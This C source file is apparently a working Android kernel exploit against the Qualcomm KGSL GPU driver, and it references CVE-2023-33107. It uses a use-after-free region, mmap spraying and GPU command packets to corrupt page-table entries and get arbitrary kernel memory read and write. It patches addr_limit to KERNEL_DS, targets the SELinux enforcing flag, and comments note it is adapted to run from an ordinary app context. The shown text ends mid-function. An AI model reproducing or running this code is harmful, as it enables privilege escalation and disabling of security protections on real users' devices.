#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <setjmp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <poll.h>
#define MARKER_NAME "KETO0422"  // name
/* DIAG: if set, the armed child performs NO syscalls (just sets gbuf[LEAK_DONE])
 * and the parent waits on gbuf instead of the socket. Isolates whether the panic
 * comes from the child's kernel-copy syscalls or from the patch/scan itself. */
#ifndef DIAG_NOOP_CHILD
#define DIAG_NOOP_CHILD 0
#endif
#ifndef DIAG_SKIP_ARMING
#define DIAG_SKIP_ARMING 0
#endif
/* DIAG: if set, the leak target is init_nsproxy (kbase+0x05db53c8) instead of
 * selinux_state, to test whether the child's kernel-copy leak mechanism works at all. */
#ifndef DIAG_LEAK_TARGET
#define DIAG_LEAK_TARGET 0
#endif
/* DIAG: if set, try a CPU write via the dangling user PTE to patch addr_limit
 * (will SIGSEGV if the CPU PTE does not persist). Default off: use GPU patch. */
#ifndef DIAG_CPU_PATCH
#define DIAG_CPU_PATCH 0
#endif
/* DIAG: if set, the child performs ONLY the leak write (no fd_zero zero, no POST leak),
 * to isolate which syscall faults. */
#ifndef DIAG_WRITE_ONLY
#define DIAG_WRITE_ONLY 0
#endif
/* DIAG: if set, the child's leak write goes to fd 1 (/dev/null) instead of the
 * socket, to isolate whether the socket (skb) path or the source-copy is the fault. */
#ifndef DIAG_DEVNULL
#define DIAG_DEVNULL 0
#endif
/* DIAG: if set, the child's leak write goes to fd2 (regular file) instead of the
 * socket, and the parent reads the leak back from fd2. Tests the generic copy path. */
#ifndef DIAG_FILE_LEAK
#define DIAG_FILE_LEAK 0
#endif
/* DIAG: if set, the child performs ONLY the fd_zero read into SET_TASKS (the zero),
 * no socket write. Tests whether read() to a kernel destination works. */
#ifndef DIAG_ZERO_ONLY
#define DIAG_ZERO_ONLY 0
#endif
/* DIAG: if set, the parent exits immediately after arming (no wait), to test whether
 * a fast kgsl teardown clears the delayed GPU-fault panic. The orphaned child still
 * fires and zeroes enforcing on its own. */
#ifndef DIAG_FAST_EXIT
#define DIAG_FAST_EXIT 0
#endif
/* DIAG: if set, after kbase derivation the parent does NOT patch/arm; it just waits
 * 10s then exits. Tests whether the GPU patch alone (parent alive) causes the panic. */
#ifndef DIAG_WAIT10
#define DIAG_WAIT10 0
#endif
/* PHASE 1: run the PFN/page-table corruption path (the standard CVE-2023-33107
 * technique) directly after the UAF free, bypassing the task_struct spray and the
 * KERNEL_DS stage2 path. mmap_spray faults user pages so their PTE pages come from
 * the freed UAF pool; scan_uaf_and_collect finds+corrupts PTE pages; mmap_check
 * verifies the PFN corruption. */
#ifndef PHASE1_PFN
#define PHASE1_PFN 0
#endif
/* PHASE4_ZERO: after the one-shot mirror maps the candidate phys (the selinux_state
 * page, page-aligned), WRITE 0 to the enforcing byte through every sig page (one of
 * them aliases the kernel page). No reads (they hang on the kernel phys). */
#ifndef PHASE4_ZERO
#define PHASE4_ZERO 0
#endif
#define MAX_FOUND_PAGES 1
#define SECOND_CHILD_START 0x900
#define FOUND_PID 0x300
#define SET_TASKS 0x200
#define SEND_ADDR 3
#define GOT_ADDR 4
#define CALL_LOGLINE 0xff0
#define CUR_PID 0xfa0
#define MMAP_CORRUPT_CNT 0x9f8
#define EX_OVER 0xffc
#define TASK_SPRAY_CLEAR 0x901
#define TARGET_PIDPID 0x40
#define LEAK_ADDR 0x180
#define LEAK_LEN  0x280
#define LEAK_DONE 0x380
#define POST_ADDR 0x3a0
#define LEAK_RES  0x3c0
char * gbuf;
int g_leaksock[2];      /* g_leaksock[1]=child write end, [0]=parent read end */
int fd;
int fd2;
int fd_lib;
/* JNI workdir override: all /data/local/tmp scratch files are relocated here so
 * the exploit can run from an app context (app_data_file). Set from Java before
 * forking the exploit child. */
char g_workdir[512] = "/data/local/tmp";

static void die_handler(int sig) {
    /* NOTE: if this task was patched to addr_limit=KERNEL_DS, ANY write()/snprintf()
     * with a user buffer here faults (user ptr treated as kernel). So just exit.
     * Parent-side logging of SIGs is unaffected (parent has USER_DS). */
    (void)sig;
    _exit(128 + sig);
}
static void install_handlers(void) {
    signal(SIGSEGV, die_handler);
    signal(SIGBUS, die_handler);
    signal(SIGABRT, die_handler);
    signal(SIGPIPE, die_handler);
    signal(SIGTERM, die_handler);
    signal(SIGFPE, die_handler);
}
/* crash-location marker that survives a kernel panic (fsync'd append to /data) */
static void mk(const char *s) {
    char stage_path[600];
    snprintf(stage_path, sizeof(stage_path), "%s/stage.txt", g_workdir);
    int mfd = open(stage_path, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (mfd >= 0) {
        char b[160];
        struct timespec ts;
        clock_gettime(CLOCK_MONOTONIC, &ts);
        int n = snprintf(b, sizeof(b), "%lld.%06d %s pid=%d\n",
                         (long long)ts.tv_sec, (int)(ts.tv_nsec / 1000), s, (int)getpid());
        (void)write(mfd, b, (size_t)n);
        (void)fsync(mfd);
        close(mfd);
    }
    fprintf(stderr, "        [M] %s\n", s);
    fflush(stderr);
}
int fd_shellcode;
int fd_zero = -1;
struct stat st;
char check_flag[100]={0,};
unsigned long long gb_target_addr;
uint64_t selinux_enforcing;
static void flush_icache(void *addr, size_t len)
{
    __builtin___clear_cache((char *)addr, (char *)addr + len);
    __sync_synchronize();
}uint8_t sig_num[] = {1,3,5,7,9};
static uint32_t g_f53_count = 0;
static uint64_t g_scan_repatch_phys = 0;
static uint64_t g_kern_pte_page = 0;   /* UAF VA of a dense (potential kernel) PTE page */
static uint64_t g_kern_cand_phys = 0;  /* candidate kernel phys for the one-shot mirror write */
static unsigned g_pte_attrindex = 0x4; /* MAIR index in the corrupted user PTE (bits [5:2]) */
static sigjmp_buf g_jb;
static volatile sig_atomic_t g_jb_armed = 0;
static void sigsegv_jmp(int sig) { (void)sig; if (g_jb_armed) siglongjmp(g_jb, 1); }
// KGSL UAPI
#define KGSL_IOC_TYPE 0x09
#define FINDING 1
#define SPRAY_COUNT 4000
#define SPRAY_COUNT_STEP 2000
#define SPRAY_COUNT_MAX 20000
#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002U
typedef struct {
    pid_t pid;
    int   do_action;
} spray_slot_t;

static spray_slot_t *spray_ctrl;  
static int spray_count = SPRAY_COUNT;
struct kgsl_gpuobj_alloc {
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapsize;          // OUT
    unsigned int id;            // OUT
    unsigned int metadata_len;
    uint64_t metadata;
};

struct kgsl_gpuobj_free {
    uint64_t flags;
    uint64_t priv;
    unsigned int id;
    unsigned int type;
    unsigned int len;
};

struct kgsl_map_user_mem {
    int fd;
    unsigned long gpuaddr;
    size_t len;
    size_t offset;
    unsigned long hostptr;
    unsigned int memtype;
    unsigned int flags;
};

#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE  _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_MAP_USER_MEM _IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)

#define DEV_PATH "/dev/kgsl-3d0"
#define PAGE_SIZE 4096

#define UAF_START      0x00000007001ff000ULL
#define UAF_SIZE       0x0000000010004000ULL

#define OVERLAP_START  0x00000007001fe000ULL
#define OVERLAP_SIZE   0x0000000000007000ULL

#define PLACEH_START   0x0000000710204000ULL
#define PLACEH_SIZE    0x0000000000010000ULL

#define BOGUS_START    0x0000000700204000ULL
#define WRAP_SIZE      0xffffffffffefd000ULL

typedef struct {
    int fd;
    volatile int ready;
    volatile int bogus_started;
    volatile int result;
    volatile int saved_errno;  
} race_state_t;


#define CP_NOP        0x10
#define CP_MEM_WRITE  0x3D
#define CP_MEM_TO_MEM 0x73

#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CONTEXT_PREAMBLE      0x00000010
#define KGSL_CMDLIST_IB            0x00000001U
#define KGSL_TIMESTAMP_RETIRED     0x00000002

struct kgsl_drawctxt_create { 
    unsigned flags, drawctxt_id; 
};

struct kgsl_command_object { 
    uint64_t offset, gpuaddr, size; 
    unsigned flags, id; 
};

struct kgsl_gpu_command {
    uint64_t flags, cmdlist; 
    unsigned cmdsize, numcmds; 
    uint64_t objlist; 
    unsigned objsize, numobjs;
    uint64_t synclist; 
    unsigned syncsize, numsyncs, context_id, timestamp;
};

struct kgsl_cmdstream_readtimestamp_ctxtid { 
    unsigned context_id, type, timestamp; 
};

struct kgsl_gpuobj_info { 
    uint64_t gpuaddr, flags, size, va_len, va_addr; 
    unsigned id; 
};

#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_GPUOBJ_INFO     _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
#define IOCTL_KGSL_GPU_COMMAND     _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID \
    _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

static inline uint32_t pm4_calc_odd_parity_bit(uint32_t val)
{
    return (0x9669u >> (0xFu & (val ^ (val >> 4) ^ (val >> 8) ^ (val >> 12) ^
                                (val >> 16) ^ (val >> 20) ^ (val >> 24) ^ (val >> 28)))) & 1u;
}
#define MMAP_SPRAY_COUNT 12000
#define MMAP_SPRAY_STRIDE 0x200000ULL
#define MMAP_SPRAY_BASE 0x0000000200000000ULL
#define SCAN_CAP_PAGES 40000
#define PAGE_SHIFT     12
#define PAGE_MASK      (~(PAGE_SIZE - 1))
#define PMD_SHIFT      21
#define PGDIR_SHIFT    30
#define PTRS_PER_PTE   512
#define PTRS_PER_PMD   512
#define PTRS_PER_PGD   512
#define PHYS_MASK      ((1ULL << 48) - 1)   // 48-bit PA 

typedef struct { uint64_t pgd; } pgd_t;
typedef struct { uint64_t pmd; } pmd_t;
typedef struct { uint64_t pte; } pte_t;

struct mm_struct {
    struct vm_area_struct *mmap;
    pgd_t *pgd;
};

#define pgd_index(addr) (((addr) >> PGDIR_SHIFT) & (PTRS_PER_PGD - 1))
#define pmd_index(addr) (((addr) >> PMD_SHIFT) & (PTRS_PER_PMD - 1))
#define pte_index(addr) (((addr) >> PAGE_SHIFT) & (PTRS_PER_PTE - 1))

#define pgd_val(x) ((x).pgd)
#define pmd_val(x) ((x).pmd)
#define pte_val(x) ((x).pte)

#define PTE_SAVE_BASE 0xf00


static int wait_timestamp(int fd, unsigned ctx_id, unsigned target);
static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t cnt);
static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi);

static void recover_origin(int fd){
    /* recover corrupted PTE. named "PTE0", "PTE1" were weired but I'm too lazy  */
    uint64_t patched_va[64] = {0};
    uint64_t saved_pte0[64] = {0};
    size_t patched_cnt = 0;
    uint32_t rb_count = *(uint32_t *)(gbuf + 0xb00);
    for (uint32_t i = 0; i < rb_count && patched_cnt < sizeof(patched_va)/sizeof(patched_va[0]); i++) {
        patched_va[patched_cnt] = *(uint64_t *)(gbuf + 0xb08 + i * 24);
        saved_pte0[patched_cnt] = *(uint64_t *)(gbuf + PTE_SAVE_BASE + i * 8);
        patched_cnt++;
    }

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC
    };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) {
        perror("recover_origin: ctx create");
        return;
    }
    unsigned ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size  = PAGE_SIZE * 2,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP
    };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) {
        perror("recover_origin: ib alloc");
        return;
    }
    unsigned ib_id = ib_alloc.id;
    void *ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED) {
        perror("recover_origin: ib mmap");
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }

    struct kgsl_gpuobj_info info = { .id = ib_id };
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    uint64_t ib_gpu = info.gpuaddr;

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size  = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP
    };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0) {
        perror("recover_origin: dst alloc");
        munmap(ib_vma, ib_alloc.mmapsize);
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }
    unsigned dst_id = dst_alloc.id;
    void *dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                         MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED) {
        perror("recover_origin: dst mmap");
        munmap(ib_vma, ib_alloc.mmapsize);
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        fr.id = dst_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }
    struct kgsl_gpuobj_info dst_info = { .id = dst_id };
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &dst_info);
    uint64_t dst_gpu = dst_info.gpuaddr;

    for (size_t i = 0; i < patched_cnt; i++) {
        uint64_t base = patched_va[i];
        if (!base) {
            fprintf(stderr,
                    "recover_origin: empty VA entry at index %zu\n",
                    i);
            continue;
        }
        uint64_t orig_pte0 = saved_pte0[i];
        if (!orig_pte0) {
            fprintf(stderr,
                    "recover_origin: no saved PTE0 for VA 0x%llx\n",
                    (unsigned long long)base);
            continue;
        }

        uint32_t *cmd = (uint32_t *)ib_vma;

        memset(ib_vma, 0, ib_alloc.mmapsize);
        int dw = 0;
        uint32_t d_lo, d_hi, s_lo, s_hi;
        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
        split64(dst_gpu, &d_lo, &d_hi);
        split64(base + 0x8, &s_lo, &s_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = s_lo;
        cmd[dw++] = s_hi;
        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        size_t bytes = (size_t)dw * 4;
        msync(ib_vma, bytes, MS_SYNC);

        struct kgsl_command_object obj = {
            .gpuaddr = ib_gpu,
            .size    = bytes,
            .flags   = KGSL_CMDLIST_IB,
            .id      = ib_id
        };

        struct kgsl_gpu_command c = {0};
        c.cmdlist    = (uint64_t)(uintptr_t)&obj;
        c.cmdsize    = sizeof(obj);
        c.numcmds    = 1;
        c.context_id = ctx_id;

        uint64_t pte1 = 0;
        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) != 0 ||
            wait_timestamp(fd, ctx_id, c.timestamp) != 0) {
            fprintf(stderr,
                    "recover_origin: PTE1 read failed for VA 0x%llx\n",
                    (unsigned long long)base);
            continue;
        } else {
            msync(dst_vma, 8, MS_SYNC | MS_INVALIDATE);
            pte1 = *(uint64_t *)dst_vma;
        }

        memset(ib_vma, 0, ib_alloc.mmapsize);
        dw = 0;

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        split64(base+8, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = (uint32_t)(orig_pte0 & 0xffffffffu);

        split64(base + 12, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = (uint32_t)(orig_pte0 >> 32);

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        bytes = (size_t)dw * 4;
        msync(ib_vma, bytes, MS_SYNC);

        obj.size = bytes;
        memset(&c, 0, sizeof(c));
        c.cmdlist    = (uint64_t)(uintptr_t)&obj;
        c.cmdsize    = sizeof(obj);
        c.numcmds    = 1;
        c.context_id = ctx_id;

        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) != 0 ||
            wait_timestamp(fd, ctx_id, c.timestamp) != 0) {
            fprintf(stderr,
                    "recover_origin: GPU restore failed for VA 0x%llx\n",
                    (unsigned long long)base);
        } else {
            fprintf(stderr,
                    "recover_origin: restored PTE0 at VA 0x%llx (PTE1=0x%016llx, PTE0=0x%016llx)\n",
                    (unsigned long long)base,
                    (unsigned long long)pte1,
                    (unsigned long long)orig_pte0);
        }
    }

    munmap(ib_vma, ib_alloc.mmapsize);
    struct kgsl_gpuobj_free fr = {0};
    fr.id = ib_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    munmap(dst_vma, dst_alloc.mmapsize);
    struct kgsl_gpuobj_free fr_dst = {0};
    fr_dst.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr_dst);
}


static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t cnt)
{
    return (7u << 28)
         | ((cnt & 0x3FFFu) << 0)
         | (pm4_calc_odd_parity_bit(cnt) << 15)
         | ((opcode & 0x7Fu) << 16)
         | (pm4_calc_odd_parity_bit(opcode) << 23);
}

static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi)
{ 
    *lo = (uint32_t)addr; 
    *hi = (uint32_t)(addr >> 32); 
}

/* submit a GPU command from ib_vma; returns 0 on success */
static int gpu_submit(int fd, void *ib_vma, size_t bytes, uint64_t ib_gpu,
                      unsigned ib_id, unsigned ctx_id)
{
    struct kgsl_command_object obj = {
        .gpuaddr = ib_gpu, .size = bytes, .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command c = {0};
    c.cmdlist = (uint64_t)(uintptr_t)&obj;
    c.cmdsize = sizeof(obj); c.numcmds = 1; c.context_id = ctx_id;
    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) != 0)
        return -1;
    if (wait_timestamp(fd, ctx_id, c.timestamp) != 0)
        return -1;
    return 0;
}

/* GPU CP_MEM_WRITE a 64-bit value to addr */
static int gpu_write64(int fd, void *ib_vma, size_t ib_len, uint64_t ib_gpu,
                       unsigned ib_id, unsigned ctx_id, uint64_t addr, uint64_t val)
{
    uint32_t *wcmd = (uint32_t *)ib_vma;
    int wdw = 0;
    memset(ib_vma, 0, ib_len);
    for (int i = 0; i < 4; i++)
        wcmd[wdw++] = cp_type7_packet(CP_NOP, 0);
    uint32_t t_lo, t_hi;
    split64(addr, &t_lo, &t_hi);
    wcmd[wdw++] = cp_type7_packet(CP_MEM_WRITE, 3);
    wcmd[wdw++] = t_lo; wcmd[wdw++] = t_hi;
    wcmd[wdw++] = (uint32_t)(val & 0xffffffffu);
    split64(addr + 4, &t_lo, &t_hi);
    wcmd[wdw++] = cp_type7_packet(CP_MEM_WRITE, 3);
    wcmd[wdw++] = t_lo; wcmd[wdw++] = t_hi;
    wcmd[wdw++] = (uint32_t)(val >> 32);
    for (int i = 0; i < 4; i++)
        wcmd[wdw++] = cp_type7_packet(CP_NOP, 0);
    msync(ib_vma, (size_t)wdw * 4, MS_SYNC);
    return gpu_submit(fd, ib_vma, (size_t)wdw * 4, ib_gpu, ib_id, ctx_id);
}

/* GPU CP_MEM_TO_MEM read 8 bytes at addr into *out (via dump buffer) */
static int gpu_read64(int fd, void *ib_vma, size_t ib_len, void *dump_vma,
                      uint64_t ib_gpu, uint64_t dump_gpu,
                      unsigned ib_id, unsigned ctx_id, uint64_t addr, uint64_t *out)
{
    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    memset(ib_vma, 0, ib_len);
    cmd[dw++] = cp_type7_packet(CP_NOP, 0);
    uint32_t d_lo, d_hi, s_lo, s_hi;
    split64(dump_gpu, &d_lo, &d_hi);
    split64(addr, &s_lo, &s_hi);
    cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
    cmd[dw++] = 0; cmd[dw++] = d_lo; cmd[dw++] = d_hi;
    cmd[dw++] = s_lo; cmd[dw++] = s_hi;
    split64(dump_gpu + 4, &d_lo, &d_hi);
    split64(addr + 4, &s_lo, &s_hi);
    cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
    cmd[dw++] = 0; cmd[dw++] = d_lo; cmd[dw++] = d_hi;
    cmd[dw++] = s_lo; cmd[dw++] = s_hi;
    cmd[dw++] = cp_type7_packet(CP_NOP, 0);
    msync(ib_vma, (size_t)dw * 4, MS_SYNC);
    if (gpu_submit(fd, ib_vma, (size_t)dw * 4, ib_gpu, ib_id, ctx_id) != 0)
        return -1;
    msync(dump_vma, 0x10, MS_SYNC | MS_INVALIDATE);
    uint32_t lo = *(uint32_t *)dump_vma;
    uint32_t hi = *(uint32_t *)((uint8_t *)dump_vma + 4);
    *out = ((uint64_t)hi << 32) | lo;
    return 0;
}

static int mmap_spray_done;
static void mmap_spray(void)
{
    
	fprintf(stderr, "\n[13] mmap-spraying user VA space\n");
	mmap_spray_done = 0;
	for (int i = 0; i < MMAP_SPRAY_COUNT; i++) {
		uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
		void *p;
        for(int j = 0 ; j < 5; j++){
            p = mmap(addr + PAGE_SIZE * (uint64_t)sig_num[j] , PAGE_SIZE,
		         PROT_READ | PROT_WRITE,
		         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
		         -1, 0);
            *(volatile uint8_t *)p = sig_num[j];                 
		    if ((uint64_t)p != (uint64_t)addr + PAGE_SIZE * (uint64_t)sig_num[j]) { fprintf(stderr,"mmap_spray"); break; }
            
        }
		
		
		mmap_spray_done++;
	}
}




static void mmap_spray_free(void)
{
	for (int i = 0; i < MMAP_SPRAY_COUNT; i++) {
		uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
        if (1){
            for(int j=0;j<5;j++){
                munmap(addr + PAGE_SIZE * (uint64_t)sig_num[j],0x1000);
            }
        }
        else {
            fprintf(stderr,"\nfind that addr\n");
        }
	}
}
static void mmap_check(void)
{
    uint64_t * check_addr = (uint64_t *)&gbuf[0xa00];
    int cnt = 0;
    uint32_t *corrupt_cnt = (uint32_t *)(gbuf + MMAP_CORRUPT_CNT);
	fprintf(stderr, "\n[14] mmap-checking user VA space\n");
	*corrupt_cnt = 0;
    for (int i = 0; i < MMAP_SPRAY_COUNT; i++) {
		uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
        uint8_t * pp =addr + PAGE_SIZE * (uint64_t)sig_num[0];
		if (*(volatile uint8_t *)pp != sig_num[0]){ // PFN write success
            fprintf(stderr,"PFN corrupted!!\n");
            gb_target_addr = (uint64_t)addr;
            // No need to pad the hole..
            for (int k = 0; k < 10; k += 2) { 
                void *hole_addr = (void *)(addr + k * PAGE_SIZE);
                
                void *filled = mmap(hole_addr, PAGE_SIZE, 
                                    PROT_READ | PROT_WRITE, 
                                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 
                                    -1, 0);
                                    
                if (filled != MAP_FAILED) {
                    *(volatile uint8_t *)filled = 0xCC; 
                }
                else{
                    fprintf(stderr, "abc %d\n",k);
                }
            }
            for (int k = 10; k < 16; k += 1) { 
                void *hole_addr = (void *)(addr + k * PAGE_SIZE);
                
                
                void *filled = mmap(hole_addr, PAGE_SIZE, 
                                    PROT_READ | PROT_WRITE, 
                                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 
                                    -1, 0);
                                    
                if (filled != MAP_FAILED) {
                    *(volatile uint8_t *)filled = 0xCC; 
                }
                else{
                    fprintf(stderr, "1234!@#$ %d\n",k);
                }
            }
            

            void *base = (void *)(addr + 0x10 * PAGE_SIZE); // pte offset = 0x130
            size_t len = 0x3e000;

            void *lib = mmap(base, len,
                 PROT_READ | PROT_EXEC,
                 MAP_PRIVATE | MAP_FIXED | MAP_POPULATE,
                 fd_lib, 0);



            if (lib == MAP_FAILED) {
                fprintf(stderr, "mmap libbase error");
                perror("mmap libbase");
                
                exit(1);
            } else 
            {

                fprintf(stderr, "success mmap libbase : va: %p\n", lib);

                volatile uint8_t *p = (volatile uint8_t *)lib;
                for (size_t off = 0; off < 0x3e000; off += PAGE_SIZE) {
                    volatile uint8_t dummy = p[off]; // touch
                    (void)dummy; // prevent opt
                }
                *(uint64_t *)&gbuf[0x400] = (uint64_t)lib;
            }
        }

        else {
            //munmap(addr,2*PAGE_SIZE); junk
        }
	}
	//*corrupt_cnt = cnt;
}


static int wait_timestamp(int fd, unsigned ctx_id, unsigned target)
{
    struct kgsl_cmdstream_readtimestamp_ctxtid r = {0};
    r.context_id = ctx_id; 
    r.type = KGSL_TIMESTAMP_RETIRED;
    
    for (unsigned spins=0; spins<100000; ++spins) {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) 
            return -1;
        if (r.timestamp >= target) 
            return 0;
        usleep(100); // from 150
    }
    return -2;
}

struct nonzero_page {
    uint64_t va;
    uint32_t data[1024];
    int non_zero_count;
};


#define USER_DS   0x0000007fffffffffULL
#define KERNEL_DS 0xffffffffffffffffULL

static int scan_uaf_for_nonzero_multi(int fd,
                                      struct nonzero_page *found_pages,
                                      int *num_found)
{
    unsigned int ctx_id = 0, ib_id = 0, dst_id = 0;
    uint64_t ib_gpu = 0, dst_gpu = 0;
    void *ib_vma = NULL, *dst_vma = NULL;
    int found = 0;
    char only_once =  0;
    *num_found = 0;

    fprintf(stderr, "\n[+] Scanning UAF region for non-zero pages\n");
    fprintf(stderr, "    Region: 0x%llx ~ 0x%llx (256MB)\n",
            (unsigned long long)UAF_START,
            (unsigned long long)(UAF_START + UAF_SIZE));
    fflush(stderr);

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC
    };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) {
        fprintf(stderr, "    [!] Failed to create GPU context\n");
        fflush(stderr);
        return 0;
    }
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size  = PAGE_SIZE * 8,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP
    };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) {
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
        goto cleanup;

    struct kgsl_gpuobj_info info = { .id = ib_id };
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size  = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP
    };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0) {
        goto cleanup;
    }
    dst_id = dst_alloc.id;
    dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                   MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED)
        goto cleanup;

    info.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;

    fprintf(stderr, "    [+] Buffers ready\n");
    fprintf(stderr, "    [*] Scanning... (. = 100 pages)\n");
    fflush(stderr);
    mk("scan buffers ready");

    uint64_t user_ds   = USER_DS;
    uint64_t kernel_ds = KERNEL_DS;
    uint32_t uds_lo = (uint32_t)(user_ds & 0xffffffffu);
    uint32_t uds_hi = (uint32_t)(user_ds >> 32);
    uint32_t kds_lo = (uint32_t)(kernel_ds & 0xffffffffu);
    uint32_t kds_hi = (uint32_t)(kernel_ds >> 32);

    uint64_t start_va   = UAF_START;
    uint64_t end_va     = UAF_START + UAF_SIZE;
    uint64_t scan_cap   = UAF_START + (uint64_t)SCAN_CAP_PAGES * PAGE_SIZE;
    if (scan_cap < end_va) end_va = scan_cap;
    uint64_t current_va = start_va;
    int pages_scanned   = 0;
    int non_zero_pages  = 0;
    int no_candidate_run = 0;

    while (current_va < end_va) {
        // CP_MEM_TO_MEM 
        uint32_t *cmd = (uint32_t *)ib_vma;
        memset(ib_vma, 0, ib_alloc.mmapsize);
        memset(dst_vma, 0, dst_alloc.mmapsize);
        int dw = 0;

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

